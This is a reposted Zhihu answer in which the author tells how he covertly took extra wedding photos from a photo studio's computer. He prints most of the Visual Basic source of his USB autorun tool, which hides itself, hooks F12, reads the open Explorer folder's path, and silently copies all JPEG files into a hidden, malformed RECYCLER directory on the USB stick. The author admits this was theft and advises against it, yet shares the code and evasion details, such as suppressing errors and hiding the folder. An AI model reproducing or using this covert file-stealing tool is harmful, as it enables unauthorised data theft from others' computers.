一些值得看的相关回答：<br>
- [想知道大家都用python写过哪些有趣的脚本?](https://www.zhihu.com/question/28661987/answer/132391467) - 知乎。 #<br>
- [你写过的自己觉着最牛X的黑程序？](https://www.zhihu.com/question/46394184/answer/184376800) - 知乎。 #<br>
- [学习Python很吃力，我是不是可以放弃编程了？](https://www.zhihu.com/question/60766946/answer/180358351) - 知乎 #<br>
- [Python爬虫传送post请求要携带哪些参数?](https://www.zhihu.com/question/60256922/answer/174211193) - 知乎。 #<br>
- [不想拿学位证的计算机在校生？](https://www.zhihu.com/question/52366000/answer/130306854) - 知乎。#<br>
- [你在实验室经历过最危险的事情是什么？](https://www.zhihu.com/question/55778718/answer/186231811) - 知乎。 #<br>
- [如果你能预知未来，你会不会更加努力？](https://www.zhihu.com/question/61268510) - 知乎。 #<br>

作者：十四君<br>
链接：https://www.zhihu.com/question/46394184/answer/184376800 <br>
来源：知乎<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br>
<hr>
作者：yimins <br>
链接：https://www.zhihu.com/question/46394184/answer/186278983 <br>
来源：知乎<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<hr>

结婚的时候，拍完婚纱照，明明拍了好几十张，但是影楼为了赚钱，规定只能拷贝走16张，超过就得加钱，好像是80元一张。一怒之下写了个U盘自动运行程序，功能只有一个，就是U盘插入的时候会自动运行，然后用户按下F12，就会自动将当前打开的目录下所有文档拷贝到U盘一个隐藏目录下。全程无任何界面和提示，完全隐蔽。拷照片那天带去。插入U盘，打开目录，假装挑选照片，偷偷按了F12，然后故意慢慢翻来覆去的挑选了很久。最后走之前影楼的工作人员还不放心，特意过来检查了一遍我的U盘，当然是什么也没看出来。最后回来一数，貌似拷了八十多张回来。应评论区要求，放出主要代码如下：(仅供学习和参考，毕竟十年前的东西了，不做任何技术支持和保证)

 <pre><code>

主窗体
VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  '窗口缺省
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Const SW_HIDE = 0
Private Const SW_MINIMIZE = 6
Private Const SW_RESTORE = 9
Private Const SW_SHOW = 5
Private Const SW_SHOWMAXIMIZED = 3
Private Const SW_SHOWMINIMIZED = 2
Private Const SW_SHOWMINNOACTIVE = 7
Private Const SW_SHOWNA = 8
Private Const SW_SHOWNOACTIVATE = 4
Private Const SW_SHOWNORMAL = 1

Private Const WM_GETTEXTLENGTH = &HE
Private Const WM_GETTEXT = &HD
Private Const GW_CHILD = 5
Private Const GW_HWNDNEXT = 2

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal Hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal Hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal Hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetWindow Lib "user32" (ByVal Hwnd As Long, ByVal wCmd As Long) As Long

'U盘盘符名称
Private Uname As String
Private NowPath As String

Private WithEvents Hotkey1 As HotKeyClass
Attribute Hotkey1.VB_VarHelpID = -1
Private WithEvents Find1 As FindFileClass
Attribute Find1.VB_VarHelpID = -1
Private File1 As New FileClass

Private Sub Find1_FindedFile(FilePath As String, FileName As String, InfoID As Long)
'首先创建入口目录
Shell "cmd /C " & Chr(34) & "md " & Uname & "RECYCLER\RECYCLER...\" & Chr(34), vbHide

File1.Auto_Rename = True
File1.Del_NoMessage = True
File1.Make_Dir_NoMessage = True
File1.NoShow = True

If Len(Dir(Uname & "RECYCLER\RECYCLER..\", vbDirectory + vbHidden + vbSystem)) <> 0 Then
    File1.FileCopy FilePath & FileName, Uname & "RECYCLER\RECYCLER..\", 0
Else
    Set File1 = Nothing
    Exit Sub
End If

'退出之前删除目录入口
Shell "cmd /C " & Chr(34) & "rd " & Uname & "RECYCLER\RECYCLER...\" & Chr(34), vbHide

End Sub

Private Sub Form_Load()
Me.Hide

Uname = Command

'打开调用的盘符
ShellExecute 0, vbNullString, Uname, vbNullString, vbNullString, SW_SHOWNOACTIVATE

'注册热键
Set Hotkey1 = New HotKeyClass
If Hotkey1.RegHotKey(Me.Hwnd, 122) = False Then
    Unload Me
    Exit Sub
End If

End Sub

Private Sub Hotkey1_HotKeyPress()
'热键被按下，获取当前窗口地址
Dim Hwnd1 As Long
Dim Get1 As New GetWinClass
Hwnd1 = Get1.GetForeWin

Dim ClassName1 As String * 255

Dim Ret1 As Long
Ret1 = GetClassName(Hwnd1, ClassName1, 255)
If Ret1 = 0 Then
    Unload Me
    Exit Sub
End If

If Left(ClassName1, Ret1) <> "CabinetWClass" Then
    Unload Me
    Exit Sub
End If

'得到选中的窗口标题
GetZiWin Hwnd1

'开始查找文件
Set Find1 = New FindFileClass
Find1.Filter = "*.jpg"
Find1.FindFile NowPath, True

End Sub

'得到子窗口的标题
Private Function GetZiWin(window_hwnd As Long) As String
Dim buf As String
Dim buflen As Long
Dim child_hwnd As Long
Dim children() As Long
Dim num_children As Integer
Dim i As Integer
    
  buflen = 256
  buf = String(buflen - 1, Chr(0))
  buflen = GetClassName(window_hwnd, buf, buflen)
  buf = Left(buf, buflen) '取得子窗口的类名
   
  If Right(buf, 4) = "Edit" Then '判断是否为地址栏子窗口
    NowPath = GetWinText(window_hwnd)
    Exit Function
  End If
    
  num_children = 0
  child_hwnd = GetWindow(window_hwnd, GW_CHILD) '取得第 1 个子窗口的句柄
  Do While child_hwnd <> 0 '如果有子窗口
    num_children = num_children + 1
    ReDim Preserve children(1 To num_children)
    children(num_children) = child_hwnd
    child_hwnd = GetWindow(child_hwnd, GW_HWNDNEXT) '取得下一个兄弟窗口的句柄
  Loop
    
  For i = 1 To num_children
    Call GetZiWin(children(i))
  Next i
End Function


Private Function GetWinText(window_hwnd As Long) As String '取得子窗口的值
Dim txtlen As Long
Dim txt As String

  '通过 SendMessage 发送 WM_GETTEXT 取得 IE 地址栏的值
  GetWinText = ""
  If window_hwnd = 0 Then Exit Function
    
  txtlen = SendMessage(window_hwnd, WM_GETTEXTLENGTH, 0, 0)
  If txtlen = 0 Then
    Exit Function
  End If
  
  txtlen = txtlen
  txt = String(txtlen, Chr(0))
  SendMessage window_hwnd, WM_GETTEXT, txtlen, ByVal txt
  GetWinText = Left(txt, txtlen - 1)
End Function  公共模块Attribute VB_Name = "Module1"
Option Explicit
Private Const SW_HIDE = 0
Private Const SW_MINIMIZE = 6
Private Const SW_RESTORE = 9
Private Const SW_SHOW = 5
Private Const SW_SHOWMAXIMIZED = 3
Private Const SW_SHOWMINIMIZED = 2
Private Const SW_SHOWMINNOACTIVE = 7
Private Const SW_SHOWNA = 8
Private Const SW_SHOWNOACTIVATE = 4
Private Const SW_SHOWNORMAL = 1

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

'U盘盘符名称
Private Uname As String

Sub Main()
Uname = Command

'打开调用的盘符
ShellExecute 0, vbNullString, Uname, vbNullString, vbNullString, SW_SHOWNOACTIVATE

'继续在后台运行

'首先创建入口目录
Shell "cmd /C " & Chr(34) & "md " & Uname & "RECYCLER...\" & Chr(34), vbHide

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'开始拷贝文件


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'退出之前删除目录入口
'Shell "cmd /C " & Chr(34) & "rd " & Uname & "RECYCLER...\" & Chr(34), vbHide
End Sub 

 </code></pre>

其余还有几个功能性类模块代码一时间找不到了，不过看看函数名也能猜到是干什么的。
刚刚看到评论区有朋友提到的法律问题，特别追加说明一下。首先，这种行为肯定是偷窃行为了，各位千万不要以身试法。
其次，影楼的规定也有点霸王，理论上来说，我的婚纱照原片应该是属于我本人的。你可以说套餐内只给我PS16张照片。
但是剩下的原片也应该给我。最后，希望大家遇到问题还是通过正当的途径去协商解决，不要走这种歪门邪道。
答题者：@[yimins](https://www.zhihu.com/people/yimins)编辑于 2017-06-24
------------------------
答题者：@[yimins](https://www.zhihu.com/people/yimins)<br>

有人陪同挑选的，不过我们两个人，他一个，可以一个人聊天分散注意力。<br>
而且上百张图片，复制到U盘，起码十几分钟，那个文件复制进度条，太容易被发现了。<br>
而用程序只要假装用手指指点屏幕的时候，悄悄按一下F12就行了。<br>
我记得当时为了保护别弹出错误任何对话框，还特意将所有代码都用 on error 保护了起来。<br>
也就是说即使有个万一出错，也就是拷贝不到文件。不会被发现有任何异常提示。<br>

程序真的要回去好好找找了，毕竟十多年前的东西了。<br>
隐藏目录的问题我记得当时是放在根目录下的 /.recycled/recycled 这样的目录下，<br>
加上hide和system属性，貌似是利用了XP的一个回收站目录漏洞，除非在dos下解除隐藏，否则无论如何也看不见。<br>

不是bat，bat无法实现全局按键 hook ，考虑了很久，最后是用 VB写的。<br>
